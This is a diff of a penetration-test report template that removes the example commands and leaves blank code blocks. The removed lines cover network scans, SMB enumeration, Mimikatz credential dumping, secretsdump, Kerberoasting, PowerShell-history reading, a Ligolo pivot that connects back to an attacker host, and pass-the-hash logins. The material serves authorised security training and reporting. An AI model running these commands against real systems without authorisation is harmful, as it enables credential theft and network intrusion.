@@ -106,11 +106,7 @@
 
 **Nmap Scan:**
 ```bash
-# Initial fast scan
-sudo nmap -Pn -sS -p- --min-rate 10000 [IP]
 
-# Detailed service scan
-sudo nmap -sC -sV -p [ports] [IP]
 ```
 
 **Key Findings:**
@@ -122,8 +118,7 @@ sudo nmap -sC -sV -p [ports] [IP]
 
 #### Web Application (if applicable)
 ```bash
-# Directory enumeration
-ffuf -w /usr/share/wordlists/dirb/common.txt -u http://[IP]:[PORT]/FUZZ -mc 200,204,301,302,307,401
+
 ```
 
 **Discovered:**
@@ -132,8 +127,7 @@ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://[IP]:[PORT]/FUZZ -mc 200,
 
 #### SMB Enumeration (if applicable)
 ```bash
-nxc smb [IP] -u '' -p '' --shares
-nxc smb [IP] -u 'guest' -p '' --shares
+
 ```
 
 ### 1.3 Exploitation
@@ -145,12 +139,12 @@ nxc smb [IP] -u 'guest' -p '' --shares
 
 1. **[Step 1]:**
 ```bash
-[command]
+
 ```
 
 2. **[Step 2]:**
 ```bash
-[command]
+
 ```
 
 **Result:** [Description of access gained]
@@ -162,11 +156,7 @@ nxc smb [IP] -u 'guest' -p '' --shares
 
 **Steps:**
 ```bash
-# Transfer exploit
-[transfer command]
 
-# Execute
-[execution command]
 ```
 
 **Result:** [New privilege level]
@@ -175,9 +165,7 @@ nxc smb [IP] -u 'guest' -p '' --shares
 
 #### Mimikatz
 ```powershell
-./mimikatz.exe
-privilege::debug
-sekurlsa::logonpasswords
+
 ```
 
 **Credentials Found:**
@@ -187,7 +175,7 @@ sekurlsa::logonpasswords
 
 #### Secretsdump
 ```bash
-impacket-secretsdump [user]@[IP] -hashes :[hash]
+
 ```
 
 **LSA Secrets:**
@@ -195,7 +183,7 @@ impacket-secretsdump [user]@[IP] -hashes :[hash]
 
 #### Kerberoasting
 ```bash
-impacket-GetUserSPNs [domain]/[user]:'[pass]' -dc-ip [DC_IP] -request
+
 ```
 
 **Service Accounts:**
@@ -206,12 +194,12 @@ impacket-GetUserSPNs [domain]/[user]:'[pass]' -dc-ip [DC_IP] -request
 #### Other Methods
 - **PowerShell History:**
 ```powershell
-type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
 ```
 
 - **Hardcoded Credentials:**
 ```bash
-strings [binary] | grep -i password
+
 ```
 
 - **Database Files:**
@@ -228,16 +216,7 @@ strings [binary] | grep -i password
 
 **Ligolo Setup:**
 ```bash
-# Attacker machine
-sudo ip tuntap add user kali mode tun ligolo
-sudo ip link set ligolo up
-./proxy -selfcert
 
-# Add route
-sudo ip route add [internal_subnet] dev ligolo
-
-# On MS01 (upload agent)
-./agent -connect [attacker_ip]:[port] -ignore-cert
 ```
 
 ### 2.2 Target Reconnaissance
@@ -245,7 +224,7 @@ sudo ip route add [internal_subnet] dev ligolo
 **Target:** [Internal IP] (MS02)
 
 ```bash
-nmap -Pn [IP]
+
 ```
 
 **Key Findings:**
@@ -262,9 +241,7 @@ nmap -Pn [IP]
 
 **Access Command:**
 ```bash
-evil-winrm -i [IP] -u [user] -p '[pass]'
-# OR
-evil-winrm -i [IP] -u [user] -H "[hash]"
+
 ```
 
 **Result:** [Access level achieved]
@@ -291,15 +268,14 @@ evil-winrm -i [IP] -u [user] -H "[hash]"
 **Exploitation:**
 ```powershell
 # Download critical files
-download [file1]
-download [file2]
+
 ```
 
 ### 2.6 Hash Extraction
 
 ```bash
 # Offline extraction
-impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
 ```
 
 **Extracted Accounts:**
@@ -334,7 +310,7 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 
 **Validation:**
 ```bash
-netexec winrm [DC_IP] -u [user] -H [hash]
+
 ```
 
 **Result:** [Pwn3d! / Failed]
@@ -343,7 +319,7 @@ netexec winrm [DC_IP] -u [user] -H [hash]
 
 **Session Establishment:**
 ```bash
-evil-winrm -i [DC_IP] -u [user] -H "[hash]"
+
 ```
 
 **Privilege Verification:**
